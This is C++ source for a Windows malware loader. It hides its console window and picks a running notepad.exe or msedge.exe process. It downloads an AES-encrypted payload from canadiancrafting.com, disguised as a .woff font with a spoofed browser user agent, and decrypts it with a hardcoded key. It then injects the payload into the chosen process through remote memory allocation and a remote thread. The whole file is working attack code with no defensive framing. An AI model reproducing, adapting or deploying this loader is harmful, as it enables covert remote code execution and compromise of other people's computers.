#include <winternl.h>
#include <windows.h>
#include <wininet.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>

#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#pragma comment (lib, "Wininet.lib")
#include <psapi.h>


int AESDecrypt(char* xcode, unsigned int xcode_len, char* key, size_t keylen) {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;

    if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        return -1;
    }
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        return -1;
    }
    if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)) {
        return -1;
    }
    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
        return -1;
    }

    if (!CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)xcode, (DWORD*)&xcode_len)) {
        return -1;
    }

    CryptReleaseContext(hProv, 0);
    CryptDestroyHash(hHash);
    CryptDestroyKey(hKey);

    return 0;
}


struct Xcode {
    BYTE* pcData;
    DWORD dwSize;
};


DWORD GetTargetPID();
BOOL Download(LPCWSTR host, INTERNET_PORT port, Xcode* xcode);
BOOL Inject(DWORD dwPID, Xcode xcode);


int main() {

    ::ShowWindow(::GetConsoleWindow(), SW_HIDE);

    DWORD pid = GetTargetPID();
    if (pid == 0) { return 1; }

    struct Xcode xcode;
    if (!Download(L"canadiancrafting.com", 80, &xcode)) { return 2; }

    if (!Inject(pid, xcode)) { return 3; }

    return 0;
}


BOOL Download(LPCWSTR host, INTERNET_PORT port, Xcode* xcode) {

    HINTERNET session = InternetOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    HINTERNET connection = InternetConnect(session, host, port, L"", L"", INTERNET_SERVICE_HTTP, 0, 0);
    HINTERNET request = HttpOpenRequest(connection, L"GET", L"/CaskaydiaCove.woff", NULL, NULL, NULL, 0, 0);

    WORD counter = 0;
    while (!HttpSendRequest(request, NULL, 0, 0, 0)) {
        counter++;
        Sleep(3000);
        if (counter >= 3) {
            return 0;
        }
    }

    DWORD bufSize = BUFSIZ;
    BYTE* buffer = new BYTE[bufSize];

    DWORD capacity = bufSize;
    BYTE* xload = (BYTE*)malloc(capacity);

    DWORD xloadSize = 0;

    while (true) {
        DWORD bytesRead;

        if (!InternetReadFile(request, buffer, bufSize, &bytesRead)) {
            return 0;
        }

        if (bytesRead == 0) break;

        if (xloadSize + bytesRead > capacity) {
            capacity *= 2;
            BYTE* newXload = (BYTE*)realloc(xload, capacity);
            xload = newXload;
        }

        for (DWORD i = 0; i < bytesRead; i++) {
            xload[xloadSize++] = buffer[i];
        }

    }
    BYTE* newPayload = (BYTE*)realloc(xload, xloadSize);

    InternetCloseHandle(request);
    InternetCloseHandle(connection);
    InternetCloseHandle(session);

    (*xcode).pcData = xload;
    (*xcode).dwSize = xloadSize;
    return 1;
}

// ------ Finding a target process ------ //

DWORD GetFirstPIDProclist(const WCHAR** aszProclist, DWORD dwSize);
DWORD GetFirstPIDProcname(const WCHAR* szProcname);

DWORD GetTargetPID() {
    const WCHAR* aszProclist[2] = {
        L"notepad.exe",
        L"msedge.exe"
    };
    return GetFirstPIDProclist(aszProclist, sizeof(aszProclist) / sizeof(aszProclist[0]));
}

DWORD GetFirstPIDProclist(const WCHAR** aszProclist, DWORD dwSize) {
    DWORD pid = 0;
    for (int i = 0; i < dwSize; i++) {
        pid = GetFirstPIDProcname(aszProclist[i]);
        if (pid > 0) {
            return pid;
        }
    }

    return 0;
}

DWORD GetFirstPIDProcname(const WCHAR* szProcname) {
    HANDLE hProcessSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hProcessSnapshot) return 0;

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    if (!Process32First(hProcessSnapshot, &pe32)) {
        CloseHandle(hProcessSnapshot);
        return 0;
    }

    DWORD pid = 0;
    while (Process32Next(hProcessSnapshot, &pe32)) {
        if (lstrcmpiW(szProcname, pe32.szExeFile) == 0) {
            pid = pe32.th32ProcessID;
            break;
        }
    }

    CloseHandle(hProcessSnapshot);
    return pid;
}

unsigned char key[] = { 0x4d, 0x72, 0x7a, 0x66, 0x55, 0x63, 0x6b, 0x57, 0x45, 0x46, 0x32, 0x31, 0x77, 0x65, 0x66, 0x78 };


// ------ Injecting into process ------ //

BOOL Inject(DWORD dwPID, Xcode xcode) {

    AESDecrypt((char*)xcode.pcData, xcode.dwSize, (char*)key, sizeof(key));

    HANDLE hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD, FALSE, dwPID);
    if (!hProcess) { return 0; };

    LPVOID pRemoteAddr = VirtualAllocEx(hProcess, NULL, xcode.dwSize, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READ);
    if (!pRemoteAddr) {
        CloseHandle(hProcess);
        return 0;
    };

    if (!WriteProcessMemory(hProcess, pRemoteAddr, xcode.pcData, xcode.dwSize, NULL)) {
        CloseHandle(hProcess);
        return 0;
    };

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteAddr, NULL, 0, NULL);
    if (hThread != NULL) {
        WaitForSingleObject(hThread, 500);

        CloseHandle(hThread);
        CloseHandle(hProcess);
        return 1;
    }

    CloseHandle(hProcess);
    return 0;
}